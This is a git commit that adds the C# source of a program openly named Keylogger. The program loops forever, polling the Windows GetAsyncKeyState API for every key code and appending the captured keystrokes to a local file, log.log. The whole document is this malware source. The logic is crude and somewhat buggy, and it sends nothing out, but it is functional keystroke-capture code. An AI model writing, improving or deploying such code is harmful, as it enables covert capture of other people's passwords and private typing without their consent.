5b4f26d34f8ab2e74b28916e9e4e382e36e9d845
septemberEatMe <vitaliiseptember@gmail.com>
2019-11-06 14:43:56 +0200

    ADD user32.dll Func

---
+++ Keylogger/Program.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+namespace Keylogger
+{
+    static class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(int i);
+        [STAThread]
+        static void Main(String[] args)
+        {
+            
+            while (true)
+            {
+                string buf = " ";
+                Thread.Sleep(100);
+                for(int i = 0; i < 255; i++)
+                {
+                    int state = GetAsyncKeyState(i);
+                    if(state != 0)
+                    {
+                        if((Keys)i == Keys.Space) { buf += "space"; continue; }
+                        if(((Keys)i).ToString().Length == 1)
+                        {
+                            buf += ((Keys)i).ToString();
+                        }
+
+                    }
+                    if(((Keys)i).ToString().Length == 1)
+                    {
+                        File.AppendAllText("log.log" , buf);
+                        buf += " ";
+                    }
+                }
+            }
+           
+        }
+    }
+}
